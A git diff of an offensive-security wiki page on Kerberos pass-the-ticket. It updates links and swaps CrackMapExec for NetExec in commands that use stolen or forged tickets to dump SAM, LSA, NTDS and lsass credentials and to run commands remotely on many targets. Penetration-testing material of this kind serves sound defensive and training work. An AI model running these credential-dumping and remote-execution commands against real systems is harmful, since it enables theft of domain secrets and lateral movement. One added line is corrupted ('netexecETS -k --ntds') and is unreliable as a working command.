@@ -6,7 +6,7 @@ description: MITRE ATT&CK™ Sub-technique T1550.003
 
 ## Theory
 
-There are ways to come across ([cached Kerberos tickets](../credentials/dumping/cached-kerberos-tickets.md)) or forge ([overpass the hash](ptk.md), [silver ticket](broken-reference) and [golden ticket](broken-reference) attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called [Pass the ticket](ptt.md). Another name for this is Pass the Cache (when using tickets from, or found on, UNIX-like systems).
+There are ways to come across ([cached Kerberos tickets](../credentials/dumping/cached-kerberos-tickets.md)) or forge ([overpass the hash](ptk.md), [silver ticket](forged-tickets/silver.md) and [golden ticket](forged-tickets/golden.md) attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called [Pass the ticket](ptt.md). Another name for this is Pass the Cache (when using tickets from, or found on, UNIX-like systems).
 
 ## Practice
 
@@ -72,19 +72,19 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) scripts like [secrets
 secretsdump.py -k $TARGET
 ```
 
-[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](broken-reference)).
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/sam-and-lsa-secrets.md)).
 
 ```bash
-crackmapexec smb $TARGETS -k --sam
-crackmapexec smb $TARGETS -k --lsa
-crackmapexec smb $TARGETS -k --ntds
+netexec smb $TARGETS -k --sam
+netexec smb $TARGETS -k --lsa
+netexecETS -k --ntds
 ```
 
-[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [CrackMapExec](https://github.com/mpgn/CrackMapExec) module (see [dumping credentials from lsass process memory](broken-reference)).
+[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [NetExec](https://github.com/Pennyw0rth/NetExec) module (see [dumping credentials from lsass process memory](../credentials/dumping/lsass.md)).
 
 ```bash
-crackmapexec smb $TARGETS -k -M lsassy
-crackmapexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
+netexec smb $TARGETS -k -M lsassy
+netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
 lsassy -k $TARGETS
 ```
 
@@ -106,11 +106,11 @@ atexec.py -k 'DOMAIN/USER@TARGET'
 dcomexec.py -k 'DOMAIN/USER@TARGET'
 ```
 
-[CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) has the ability to do it on a set of targets
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets
 
 ```bash
-crackmapexec winrm $TARGETS -k -x whoami
-crackmapexec smb $TARGETS -k -x whoami
+netexec winrm $TARGETS -k -x whoami
+netexec smb $TARGETS -k -x whoami
 ```
 
 On Windows, legitimate tools like the [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) ([download](https://live.sysinternals.com/)) can then be used to open a cmd using that ticket.
